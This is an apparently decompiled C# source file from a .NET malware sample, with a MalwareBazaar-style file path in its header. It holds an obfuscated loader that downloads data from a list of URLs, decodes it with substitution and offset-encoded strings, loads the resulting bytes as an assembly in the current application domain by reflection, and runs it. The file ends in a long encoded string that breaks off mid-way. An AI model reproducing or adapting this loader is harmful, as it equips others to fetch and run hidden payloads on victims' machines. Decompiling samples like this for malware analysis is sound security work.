// Decompiled with JetBrains decompiler
// Type: NtsbLSIBblAwJ.mPlFLhFIklHmYnKFlapc
// Assembly: LFuwyIFzJAC, Version=7.866.939.297, Culture=neutral, PublicKeyToken=null, ProcessorArchitecture=X86
// MVID: FFD5BA9E-2E77-44F7-BCF2-A9F7A823D599
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\UDS-DangerousObject.Multi.Generic-5a8549efba8b78be8994f7fe226477a842e880cf9d5f5dfc29f6db22cd907d98.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using WnyBEpYljnRoftDpleVNnB;

namespace NtsbLSIBblAwJ
{
  internal class mPlFLhFIklHmYnKFlapc
  {
    public mPlFLhFIklHmYnKFlapc(List<string> shit3)
      : this()
    {
      ((IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR) this).XYkdBLVkzQrMlEXhuGMbOjiacnJNJlfOMkrtd = shit3;
      this.OPXNRuYqXRqxKpHFjwP();
    }

    public void OPXNRuYqXRqxKpHFjwP()
    {
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        if (((mPlFLhFIklHmYnKFlapc) mPlFLhFIklHmYnKFlapc.get_GQtunDUHuQ()).get_FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA().Length < 300)
        {
          string str1 = Microsoft.VisualBasic.Strings.Mid(mPlFLhFIklHmYnKFlapc.VMYRAMPpcACsmlwBqKiTnYTcpKM(), 21, 10);
          foreach (string address in ((IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR) this).XYkdBLVkzQrMlEXhuGMbOjiacnJNJlfOMkrtd)
          {
label_5:
            try
            {
              string str2 = new WebClient()
              {
                Headers = {
                  Regex.Replace(mPlFLhFIklHmYnKFlapc.gPGmPYDeNEoSmrXYLcRnXvknNWTVBPcdgmtN(), mPlFLhFIklHmYnKFlapc.vxXlXDEvMBfrYHUVSLEtyTfHCXClLZ(), string.Empty)
                }
              }.DownloadString(address);
              if (str2.StartsWith(Microsoft.VisualBasic.Strings.Mid(mPlFLhFIklHmYnKFlapc.mLGupLyHIsksQkQuiktHisBCspJZbtJMCVema(), 26, 3)) && str2.EndsWith(mPlFLhFIklHmYnKFlapc.hnXKfINRshcBGqbTkdbZbyFpJxPUgDtIEmu().Remove(3, 21)))
              {
                string str3 = str2.Replace(mPlFLhFIklHmYnKFlapc.vTFyrSTrhgmTkcXyGfOruvlYWlDNtWuVQlOkwBKGLYCrCaV().Replace(mPlFLhFIklHmYnKFlapc.jYgGTnaIGBfogXkMqdZo(), mPlFLhFIklHmYnKFlapc.euhFwTvVqcqkYnpXOBPZFrFbrFlX()), mPlFLhFIklHmYnKFlapc.JhULynRgPlGOmPNmybgbAlmfPQavCnj()).Replace(mPlFLhFIklHmYnKFlapc.PGcdBRJgHLEtRfPoegkQTMyVOWInvEBbH().Remove(0, 24), mPlFLhFIklHmYnKFlapc.iKiWkxVTzHLXKkhxhZhBd());
                for (int index = 0; index < str1.Length; ++index)
                {
                  try
                  {
                    char oldChar = str1[index];
                    char newChar = Convert.ToChar(index.ToString());
                    str3 = str3.Replace(oldChar, newChar);
                    str3 = str3.Replace(oldChar, newChar);
                  }
                  catch
                  {
                  }
                }
                stringBuilder.Append(str3);
              }
            }
            catch (Exception ex)
            {
              if (!address.Contains(Regex.Replace(IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.pFivKckDLyIGDVkatYTYndYXdoguczRtaETrbkQpeZzcDECW(), IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.DjkTlGlsvWQAmGoGYbS(), string.Empty)))
                goto label_5;
            }
          }
          ((mPlFLhFIklHmYnKFlapc) mPlFLhFIklHmYnKFlapc.get_GQtunDUHuQ()).set_FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA(stringBuilder.ToString());
          mPlFLhFIklHmYnKFlapc.get_GQtunDUHuQ().Save();
        }
        else
          stringBuilder.Append(((mPlFLhFIklHmYnKFlapc) mPlFLhFIklHmYnKFlapc.get_GQtunDUHuQ()).get_FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA());
      }
      catch
      {
      }
      MemoryStream bigarray = new MemoryStream();
      string str4 = stringBuilder.ToString();
      char[] chArray = new char[1]
      {
        Convert.ToChar(Microsoft.VisualBasic.Strings.Mid(ZOKNJkAXxLRmhmaeLxBSIGymCImrIYZFDponvO.NcJidzVzKDxdLojQK(), 19, 1))
      };
      foreach (string str5 in str4.Split(chArray))
        bigarray.WriteByte((byte) Convert.ToInt32(str5));
      IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.XVuichiUEdhrgEtlBjOcymxQEmXyuGNqXKrSLbZf qemXyuGnqXkrSlbZf = (IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.XVuichiUEdhrgEtlBjOcymxQEmXyuGNqXKrSLbZf) new mPlFLhFIklHmYnKFlapc(bigarray);
      Environment.Exit(0);
    }

    private static void ZxIYQgxlbnIqZewuri(string[] LBgCnFONLlIRYNIWXekJQrOqGZJrZVjiY)
    {
      // ISSUE: reference to a compiler-generated method
      IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR znzIwKasdxJxmRhR = (IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR) new mPlFLhFIklHmYnKFlapc(new List<string>()
      {
        Regex.Replace(CiMQblBeEHxXZbNyrtJepERj.BiHoXCtlAtsutVNZyTSKFfIGMLmRIHRG(), IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.XVuichiUEdhrgEtlBjOcymxQEmXyuGNqXKrSLbZf.rHbKcRNCEYsUQWOZgPvcZI(), string.Empty),
        IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.XVuichiUEdhrgEtlBjOcymxQEmXyuGNqXKrSLbZf.gtSLKMCokDglRaCosf().Remove(55, 21)
      });
    }

    public mPlFLhFIklHmYnKFlapc()
      : this()
    {
    }

    [SpecialName]
    public static CiMQblBeEHxXZbNyrtJepERj get_GQtunDUHuQ()
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: variable of a compiler-generated type
      CiMQblBeEHxXZbNyrtJepERj xayCycQrFlqjxatf = CiMQblBeEHxXZbNyrtJepERj.HuWkjiXODsXayCYCQrFlqjxatf;
      return xayCycQrFlqjxatf;
    }

    [SpecialName]
    public string get_FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA() => (string) ((SettingsBase) this)["FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA"];

    [SpecialName]
    public void set_FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA(string value) => ((SettingsBase) this)["FqVvKIuGeMaPvhoYZGTyWVRdCgvjftfQihXA"] = (object) value;

    public mPlFLhFIklHmYnKFlapc()
      : this()
    {
    }

    static mPlFLhFIklHmYnKFlapc() => CiMQblBeEHxXZbNyrtJepERj.HuWkjiXODsXayCYCQrFlqjxatf = (CiMQblBeEHxXZbNyrtJepERj) SettingsBase.Synchronized((SettingsBase) new mPlFLhFIklHmYnKFlapc());

    public mPlFLhFIklHmYnKFlapc(MemoryStream bigarray)
      : this()
    {
      ((IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.XVuichiUEdhrgEtlBjOcymxQEmXyuGNqXKrSLbZf) this).OdXjyKYFvCSoyizIuKBXn = bigarray;
      this.XjBvCHLCkaDraYxiLm();
    }

    private void XjBvCHLCkaDraYxiLm() => Versioned.CallByName(Versioned.CallByName(Versioned.CallByName((object) AppDomain.CurrentDomain, ZOKNJkAXxLRmhmaeLxBSIGymCImrIYZFDponvO.PJPUzDNTNWFBdZwQgAKi().Replace(CiMQblBeEHxXZbNyrtJepERj.SKsxAsfQnthjIXikEpGhDfctdpxcpazDzQeCgnAIfri(), CiMQblBeEHxXZbNyrtJepERj.NSYqgSAipFpYukUcBnTD()), CallType.Get, (object) ((IFPkPHhGkTbHNLUoJTiWhbZGNZnzIWKasdxJXmRhR.XVuichiUEdhrgEtlBjOcymxQEmXyuGNqXKrSLbZf) this).OdXjyKYFvCSoyizIuKBXn.ToArray()), CiMQblBeEHxXZbNyrtJepERj.TGdycfzxOUxmCF().Remove(2, 28), CallType.Get), Microsoft.VisualBasic.Strings.Mid(CiMQblBeEHxXZbNyrtJepERj.UHdqAzmiLdGFEdosgUZsnHPvI(), 28, 6), CallType.Method, (object) true, null);

    static mPlFLhFIklHmYnKFlapc()
    {
    }

    public static string VMYRAMPpcACsmlwBqKiTnYTcpKM()
    {
      string source = "ٽڛڢڣڦڙڇڙڗڨڝڣڢټڕڢژڠڙڦڢڥٷږڦچګٽٵٻڊڣڠڕڨڝڠڙچڙڕژ";
      string str = "1588";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string gPGmPYDeNEoSmrXYLcRnXvknNWTVBPcdgmtN()
    {
      string source = "ٽڛڢڣڦڙڇڙڗڨڝڣڢټڕڢژڠڙڦڢڥٷږڦچګٽٵٻڊڣڠڕڨڝڠڙچڙڕژ";
      string str = "52729";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string vxXlXDEvMBfrYHUVSLEtyTfHCXClLZ()
    {
      string source = "ĪĭīńÿÿÿÿüīńÿÿĆĕĬú";
      string str = "207";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string mLGupLyHIsksQkQuiktHisBCspJZbtJMCVema()
    {
      string source = "㇟㇝\u31EC㇗\u31BC㇝㇞㇙\u31ED\u31E4\u31EC㇀㇝㇙㇜㇝\u31EA\u31BB㇝\u31E4\u31E4㇌ㇱ\u31E8㇝ㆴ\u31E8ㆶ\u31BF㇝\u31EC㇊㇟\u31E6ㆺ\u31E7ㇰ";
      string str = "12664";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string hnXKfINRshcBGqbTkdbZbyFpJxPUgDtIEmu()
    {
      string source = "鴰鴣鵤鴻鵙鵨鵈鵙鵬鵨鴹鵬鵨鵙鵢鵨鵄鵣鵝鵢鵨鴧鴦鴵鴲";
      string str = "40180";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string vTFyrSTrhgmTkcXyGfOruvlYWlDNtWuVQlOkwBKGLYCrCaV()
    {
      string source = "ꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꧣꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨗꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꧥꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋ꧳ꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨐꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨝꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨌꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨙꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨗꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨖꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨖꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨓꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋ꧇ꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨔꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨈꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨛꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨊꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋꨏꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔꧨꨙ꧹ꨔꨉ꧰ꨌ꧲\uA9FFꨑ꧷ꨘꨌꧭꨞꧨ꧹꧶ꧯꨗ꧴ꨋꨏꨞ꧶ꧪꨙꨁ꧹꧱ꧻꨐꨉꨚꨟꨉꧻꨜꧬꨒꨞꨠꨑꨝ꧹ꨡꨌ꧹ꨋꨝꨐꨟꧨꨟꨑ꧲꧷ꨔꨍ꧵꧲ꨍꧨꧾꨏꨊꨔꨀꨠ\uA9FFꨜꨕ꧲ꧪꧮ꧱\uA9FFꨈ\uA9FFꨋ꧇ꨘ\uA9FFꨉ꧱ꨋꨡꨔꨚꨠꨒꨛ\uA9FFꨒ꧳ꨁꧮꨟ꧸ꨏ꧱ꧯꧺꨙ꧴ꧻ꧲ꧽꨖꧻ꧶ꧻꨎꨝꨋ꧱ꧼꨜ꧰ꨁ꧳ꧽꨌꧨꨙꧼꨒ꧸꧵ꨔ